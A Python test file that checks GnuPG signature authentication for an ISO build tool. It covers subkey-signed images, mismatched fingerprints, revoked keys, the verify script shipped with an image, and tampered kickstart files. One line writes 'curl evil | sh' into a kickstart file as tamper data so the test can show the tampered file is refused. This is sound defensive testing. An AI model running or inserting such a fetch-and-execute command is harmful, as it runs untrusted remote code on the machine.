#!/usr/bin/env python3
"""Signature authentication checks, against real GnuPG keys.

These generate a throwaway key with a signing subkey — the normal shape of a
GnuPG key, and what `gen-key --use-key` adopts — sign a fixture with it, and
then revoke it. Both facts they rest on were measured here rather than assumed:

  * VALIDSIG names the key that made the signature FIRST (a signing subkey when
    there is one) and the primary LAST.
  * A revoked key still produces VALIDSIG and gpg still exits 0. Only GOODSIG
    turning into REVKEYSIG, plus KEYREVOKED, distinguishes it.

Skipped, loudly, when gpg is unavailable.
"""
from __future__ import annotations

import hashlib
import importlib.util
import io
import contextlib
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from types import SimpleNamespace

ROOT = Path(__file__).resolve().parent.parent
spec = importlib.util.spec_from_file_location("build_iso", ROOT / "build_iso.py")
bi = importlib.util.module_from_spec(spec)
spec.loader.exec_module(bi)

rc_spec = importlib.util.spec_from_file_location(
    "release_candidate", ROOT / "release_candidate.py")
rcm = importlib.util.module_from_spec(rc_spec)
rc_spec.loader.exec_module(rcm)

CHECKS = 0


def check(name: str, ok: bool, detail: str = "") -> None:
    global CHECKS
    CHECKS += 1
    if not ok:
        raise AssertionError(f"{name}{': ' + detail if detail else ''}")


def gpg(home: Path, *argv: str, **kw) -> subprocess.CompletedProcess:
    env = dict(os.environ, GNUPGHOME=str(home))
    return subprocess.run(["gpg", "--batch", "--yes", *argv], env=env,
                          capture_output=True, text=True, **kw)


def make_key(home: Path) -> str:
    """A primary key plus a separate signing subkey, and its fingerprint."""
    gpg(home, "--passphrase", "", "--pinentry-mode", "loopback",
        "--quick-generate-key", "Unit Signing <u@example.invalid>",
        "rsa2048", "sign", "never")
    listing = gpg(home, "--list-secret-keys", "--with-colons").stdout
    fpr = next(line.split(":")[9] for line in listing.splitlines()
               if line.startswith("fpr:"))
    gpg(home, "--passphrase", "", "--pinentry-mode", "loopback",
        "--quick-add-key", fpr, "rsa2048", "sign", "never")
    return fpr


def status_for(home: Path, sig: Path, target: Path) -> tuple[str, int]:
    p = gpg(home, "--status-fd", "1", "--verify", str(sig), str(target))
    return p.stdout, p.returncode


def main() -> int:
    if not shutil.which("gpg"):
        print("\n  SKIP  signature checks — gpg is not installed.")
        return 0

    with tempfile.TemporaryDirectory() as td:
        work = Path(td)
        home = work / "gnupg"
        home.mkdir(mode=0o700)
        fpr = make_key(home)

        payload = work / "image.iso"
        payload.write_bytes(b"pretend-iso-content")
        sig = work / "image.iso.asc"
        gpg(home, "--passphrase", "", "--pinentry-mode", "loopback",
            "--detach-sign", "--output", str(sig), str(payload))
        status, code = status_for(home, sig, payload)

        # The premise. If gpg ever stops signing with the subkey, the rest of
        # this file is testing something other than what it claims.
        validsig = next(ln for ln in status.splitlines()
                        if ln.startswith("[GNUPG:] VALIDSIG "))
        fields = validsig.split()
        signer, primary = fields[2].upper(), fields[-1].upper()
        check("the signature was made by a subkey, not the primary",
              signer != primary, validsig)
        check("VALIDSIG's last field is the primary key", primary == fpr.upper())

        # 1. A genuine image signed via a subkey must authenticate against the
        #    configured PRIMARY fingerprint. Comparing only VALIDSIG's first
        #    field rejected it, so an adopted key could build an image its own
        #    tooling then refused.
        check("primary fingerprint is accepted",
              bi.authenticate_signature(status, code, fpr) == signer)
        check("the subkey fingerprint is accepted too",
              bi.authenticate_signature(status, code, signer) == signer)
        # release_candidate.py's gate is the last check before an artefact is
        # staged for distribution, so it has to agree. It reads the ambient
        # keyring, so point that at this throwaway one for the duration.
        os.environ["GNUPGHOME"] = str(home)
        rcm.verify_signature(payload, sig, fpr)
        check("release gate accepts a subkey-signed image", True)

        # 2. An unrelated fingerprint is refused.
        try:
            bi.authenticate_signature(status, code, "B" * 40)
        except bi.Fatal as exc:
            check("an unrelated fingerprint is refused", "not by the configured" in str(exc))
        else:
            raise AssertionError("expected Fatal for a mismatched fingerprint")

        # 3. Revoke the key. gpg still exits 0 and still emits VALIDSIG, so a
        #    check resting on VALIDSIG alone accepts it.
        rev = work / "revocation.asc"
        rev.write_text(
            (home / "openpgp-revocs.d" / f"{fpr}.rev").read_text()
            .replace("\n:", "\n").lstrip(":"))
        gpg(home, "--import", str(rev))
        revoked_status, revoked_code = status_for(home, sig, payload)
        check("gpg still exits 0 for a revoked key", revoked_code == 0)
        check("gpg still emits VALIDSIG for a revoked key",
              "[GNUPG:] VALIDSIG " in revoked_status)
        check("the revocation shows up as REVKEYSIG/KEYREVOKED",
              "REVKEYSIG" in revoked_status or "KEYREVOKED" in revoked_status)
        try:
            bi.authenticate_signature(revoked_status, revoked_code, fpr)
        except bi.Fatal as exc:
            check("a revoked signing key is refused", "REVOKED" in str(exc).upper())
        else:
            raise AssertionError("expected Fatal for a revoked signing key")

        # 4. The release gate must refuse the revoked key too — same call,
        #    same files, only the keyring has changed.
        try:
            rcm.verify_signature(payload, sig, fpr)
        except rcm.Gate as exc:
            check("release gate refuses a revoked key", "revoked" in str(exc))
        else:
            raise AssertionError("release gate accepted a revoked key")

        # 5. The script that travels with the image must agree with all of it.
        #    It is what a recipient actually runs.
        out = work / "out"
        out.mkdir()
        cfg = dict(bi.DEFAULT_CONFIG)
        cfg["work_dir"] = str(work / "w")
        cfg["iso_sign_key"] = fpr
        x = bi.Ctx(cfg, SimpleNamespace(action="iso", dry_run=False,
                                        allow_unsigned=False,
                                        passphrase_file=None, force=False))
        x.out_dir.mkdir(parents=True, exist_ok=True)
        iso = x.out_dir / cfg["iso_name"]
        iso.write_bytes(payload.read_bytes())
        digest = hashlib.sha256(iso.read_bytes()).hexdigest()
        (x.out_dir / f"{cfg['iso_name']}.sha256").write_text(
            f"{digest}  {cfg['iso_name']}\n")
        shutil.copy(sig, x.out_dir / f"{cfg['iso_name']}.asc")
        gpg(home, "--armor", "--output",
            str(x.out_dir / "unit-signing-key.asc"), "--export", fpr)
        with contextlib.redirect_stdout(io.StringIO()):
            bi.write_verify_script(x, digest)
        script = x.out_dir / "verify-iso.sh"
        script.chmod(0o755)

        recipient = work / "recipient-gnupg"
        recipient.mkdir(mode=0o700)
        proc = subprocess.run([str(script), fpr], cwd=x.out_dir,
                              env=dict(os.environ, GNUPGHOME=str(recipient)),
                              capture_output=True, text=True)
        # The exported key now carries the revocation, so the shipped script
        # must refuse — the same refusal the build-host check makes.
        check("verify-iso.sh refuses a revoked signing key",
              proc.returncode != 0, proc.stdout[-400:])
        check("verify-iso.sh says why it refused",
              "revoked" in proc.stdout.lower(), proc.stdout[-400:])

    # verify_detached_signature is what write-usb runs over the image AND
    # over the install-time kickstart: a real signature verifies and names the
    # primary, a payload changed after signing is refused.
    with tempfile.TemporaryDirectory() as td:
        work = Path(td)
        home = work / "gnupg"
        home.mkdir(mode=0o700)
        fpr = make_key(home)
        ks = work / "ks.cfg"
        ks.write_text("%post\necho hi\n%end\n")
        sig = work / "ks.cfg.asc"
        gpg(home, "--passphrase", "", "--pinentry-mode", "loopback", "--armor",
            "--detach-sign", "--output", str(sig), str(ks))
        # The key's fingerprints: the primary and the signing subkey. The
        # authenticator returns whichever made the signature.
        fprs = {line.split(":")[9].upper() for line in
                gpg(home, "--list-secret-keys", "--with-colons").stdout.splitlines()
                if line.startswith("fpr:")}
        os.environ["GNUPGHOME"] = str(home)
        try:
            check("a signed kickstart verifies against the release key",
                  bi.verify_detached_signature(sig, ks, fpr) in fprs)
            ks.write_text("%post\ncurl evil | sh\n%end\n")
            try:
                bi.verify_detached_signature(sig, ks, fpr)
            except bi.Fatal:
                check("a kickstart changed after signing is refused", True)
            else:
                check("a kickstart changed after signing is refused", False,
                      "the tampered payload verified")
        finally:
            del os.environ["GNUPGHOME"]
    print(f"  {CHECKS}/{CHECKS} signature authentication checks pass")
    return 0


if __name__ == "__main__":
    sys.exit(main())
